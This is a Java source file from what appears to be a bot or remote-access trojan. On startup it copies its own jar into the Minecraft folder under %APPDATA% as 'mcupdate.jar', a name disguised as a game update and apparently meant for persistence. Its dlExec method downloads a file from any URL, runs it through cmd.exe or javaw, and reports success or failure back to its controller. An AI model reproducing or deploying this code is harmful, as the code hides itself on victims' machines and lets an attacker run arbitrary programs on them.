package syn.utils;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.channels.FileChannel;

import syn.main.Core;
import syn.main.Client;
import syn.main.Utilities;

public class FileUtils extends Utilities {
	
	private String destDir;
	private String destFile;
	private boolean makeDirSuccess = false;
	
	public FileUtils() {
		startup();
	}
	
	public void startup() {
		if(!check() && !Settings.debugMode) {
			init();
		}
	}
	
	private boolean check() {
		destDir = System.getenv("APPDATA") + "/.minecraft/";
		destFile = destDir + "mcupdate.jar";
		File destFileCheck = null;
		destFileCheck = new File(destFile);
		return destFileCheck.exists();
	}
	
	private void init() {
		if(procOS(Client.os).equals("WIN")) {
			destDir = System.getenv("APPDATA") + "/.minecraft/";
			File fdestDir = new File(destDir);
			if(!fdestDir.exists()) {
				makeDirSuccess = fdestDir.mkdir();
			} else {
				makeDirSuccess = true;
			}
			destFile = destDir + "mcupdate.jar";
		}
		
		if(makeDirSuccess) {
			cloneFile();
		}
	}
	
	private void cloneFile() {
		try {
			copyFile(new File(getJarFolder()), new File(destFile));
		} catch (IOException e) {e.printStackTrace();}
	}
	
	private String getJarFolder() {
		String decodedPath = "";
		String path = Core.class.getProtectionDomain().getCodeSource().getLocation().getPath();
		try {
			decodedPath = URLDecoder.decode(path, "UTF-8");
		} catch (UnsupportedEncodingException e) {}
		decodedPath = decodedPath.substring(1, decodedPath.length());
		return decodedPath;
	} 
	
	private boolean copyFile(File source, File dest) throws IOException {
		FileChannel inputChannel = null;
		FileChannel outputChannel = null;
		try {
			inputChannel = new FileInputStream(source).getChannel();
			outputChannel = new FileOutputStream(dest).getChannel();
			outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
			return true;
		}  catch (Exception e) {e.printStackTrace(); return false;} finally {
			inputChannel.close();
			outputChannel.close();
		}
	}

	public void dlExec(String url, String file) {
		try {
			boolean isJava;
			if(file.contains(".jar")) {
				isJava = true;
			} else {
				isJava = false;
			}
			BufferedInputStream in = new java.io.BufferedInputStream(new URL(url).openStream());
			FileOutputStream fos = new FileOutputStream(file);
			BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
			byte data[] = new byte[1024];
			int count;
			while( (count = in.read(data,0,1024)) != -1){
				bout.write(data,0,count);
			}
			fos.flush();
			fos.close();
			String absolutePath = new File("").getAbsolutePath() + "\\" + file;
			if(isJava) {
				Runtime.getRuntime().exec("cmd.exe /C " + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar " + absolutePath);
			} else {
				Runtime.getRuntime().exec("cmd.exe /C " + absolutePath);
			}
		} catch (Exception e) { 
			if(e instanceof IOException) {
				try {
					super.write("DL OK | EXEC FAIL");
				} catch (IOException e1) {}
				e.printStackTrace();
			} else {
				StringWriter errors = new StringWriter();
				e.printStackTrace(new PrintWriter(errors));
				try {
					super.write("DL FAIL \r\n" + errors.toString());
				} catch (IOException e1) {}
			}
		}
	}
	
	public String getNewFile() {
		return destFile;
	}
}